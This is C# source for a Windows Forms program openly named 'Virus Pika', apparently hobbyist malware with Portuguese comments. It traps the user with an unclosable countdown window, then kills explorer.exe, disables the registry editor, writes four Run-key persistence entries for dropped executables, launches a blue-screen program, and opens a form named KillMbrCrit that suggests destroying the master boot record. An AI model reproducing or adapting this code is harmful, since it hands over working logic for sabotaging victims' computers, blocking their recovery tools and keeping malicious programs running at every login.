using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Virus_Pika__By_Waguinho_
{
    public partial class janelapika : Form
    {


        public janelapika()
        {
            InitializeComponent();
        }
        

        private void janelapika_Load(object sender, EventArgs e)
        {
            tempo.Start();
            var temp = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Temp";
            var start = DateTime.Now;
            var tim = new Timer() { Interval = 1000 };
            tim.Tick += (obj, args) =>
            tempolbl.Text = (TimeSpan.FromMinutes(7) - (DateTime.Now - start)).ToString("mm\\:ss"); 
            tim.Enabled = true;

            if (File.Exists(@"c:\windows\timeup.sys") == true)
            {
                this.Hide();
                tim.Enabled = false;
               
                
                try
                {
                    File.Delete(@"c:\program files\temp\sound.exe");
                } catch (Exception ex) {}
                
                
                
                if (File.Exists(@"C:\Program Files\Temp\RBSOD.exe"))
                {
                    Process.Start(@"C:\Program Files\Temp\RBSOD.exe");
                    ProcessStartInfo tkk = new ProcessStartInfo();    // RBSOD.EXE
                    tkk.FileName = "cmd.exe";
                    tkk.WindowStyle = ProcessWindowStyle.Hidden;
                    tkk.Arguments = "/k taskkill /f /im \"virus pika [by waguinho].exe\"";

                    Process.Start(tkk);
                }

                else if (File.Exists(@"C:\Windows\DTH.exe"))   //CÓPIA PASTA WINDOWS
                {
                    Process.Start(@"C:\Windows\DTH.exe");
                    ProcessStartInfo tkk = new ProcessStartInfo();
                    tkk.FileName = "cmd.exe";
                    tkk.WindowStyle = ProcessWindowStyle.Hidden;
                    tkk.Arguments = "/k taskkill /f /im \"virus pika [by waguinho].exe\"";

                    Process.Start(tkk);
                }
                else if (File.Exists(@"C:\NOPE.exe"))   //CÓPIA PASTA C:
                {
                    Process.Start(@"C:\NOPE.exe");
                    ProcessStartInfo tkk = new ProcessStartInfo();
                    tkk.FileName = "cmd.exe";
                    tkk.WindowStyle = ProcessWindowStyle.Hidden;
                    tkk.Arguments = "/k taskkill /f /im \"virus pika [by waguinho].exe\"";

                    Process.Start(tkk);
                }
                else if (File.Exists(temp + @"\fds.exe"))   //LOCAL NA PASTA %TEMP% (USUARIO)
                {
                    Process.Start(temp + @"\fds.exe");
                    ProcessStartInfo tkk = new ProcessStartInfo();
                    tkk.FileName = "cmd.exe";
                    tkk.WindowStyle = ProcessWindowStyle.Hidden;
                    tkk.Arguments = "/k taskkill /f /im \"virus pika [by waguinho].exe\"";

                    Process.Start(tkk);
                }
            }
        }

        private void janelapika_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }

        private void tempolbl_Click(object sender, EventArgs e)
        {

        }

        private void tempo_Tick(object sender, EventArgs e)
        {
            tempo.Stop();
            this.Hide();
            
            var temp = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Temp";
            File.Create(@"c:\windows\timeup.sys");

            KillMbrCrit killcrit = new KillMbrCrit();
            killcrit.Show();

            RegistryKey ereg = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            ereg.SetValue("DisableRegistryTools", 0, RegistryValueKind.DWord);

            RegistryKey rsod = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run");
            rsod.SetValue("Rsod", @"C:\Program Files\temp\RBSOD.exe");

            RegistryKey dth = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run");
            dth.SetValue("dth", @"C:\windows\dth.exe");

            RegistryKey nope = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run");
            nope.SetValue("nope", @"C:\nope.exe");

            RegistryKey fds = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run");
            fds.SetValue("fds", temp + @"\fds.exe");

            Process.Start("taskkill", "/f /im explorer.exe");

            RegistryKey desreg = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            desreg.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);

            //IF DO ARQUIVO EXE DE TELA DA MORTE
            if (File.Exists(@"C:\Program Files\Temp\RBSOD.exe"))
                {
                    Process.Start(@"C:\Program Files\Temp\RBSOD.exe");
                    ProcessStartInfo tkk = new ProcessStartInfo();    // RBSOD.EXE
                    tkk.FileName = "cmd.exe";
                    tkk.WindowStyle = ProcessWindowStyle.Hidden;
                    tkk.Arguments = "/k taskkill /f /im \"virus pika [by waguinho].exe\"";

                    Process.Start(tkk);
                }

                else if (File.Exists(@"C:\Windows\DTH.exe"))   //CÓPIA PASTA WINDOWS
                {
                    Process.Start(@"C:\Windows\DTH.exe");
                    ProcessStartInfo tkk = new ProcessStartInfo();
                    tkk.FileName = "cmd.exe";
                    tkk.WindowStyle = ProcessWindowStyle.Hidden;
                    tkk.Arguments = "/k taskkill /f /im \"virus pika [by waguinho].exe\"";

                    Process.Start(tkk);
                }
                else if (File.Exists(@"C:\NOPE.exe"))   //CÓPIA PASTA C:
                {
                    Process.Start(@"C:\NOPE.exe");
                    ProcessStartInfo tkk = new ProcessStartInfo();
                    tkk.FileName = "cmd.exe";
                    tkk.WindowStyle = ProcessWindowStyle.Hidden;
                    tkk.Arguments = "/k taskkill /f /im \"virus pika [by waguinho].exe\"";

                    Process.Start(tkk);
                }
                else if (File.Exists(temp + @"\fds.exe"))   //LOCAL NA PASTA %TEMP% (USUARIO)
                {
                    Process.Start(temp + @"\fds.exe");
                    ProcessStartInfo tkk = new ProcessStartInfo();
                    tkk.FileName = "cmd.exe";
                    tkk.WindowStyle = ProcessWindowStyle.Hidden;
                    tkk.Arguments = "/k taskkill /f /im \"virus pika [by waguinho].exe\"";

                    Process.Start(tkk);
                }
               
        }

        private void regras_MouseEnter(object sender, EventArgs e)
        {
            Cursor.Current = Cursors.Hand;
        }

        private void regras_Click(object sender, EventArgs e)
        {
            REGRAS rls = new REGRAS();
            rls.ShowDialog();
        }
    }
}
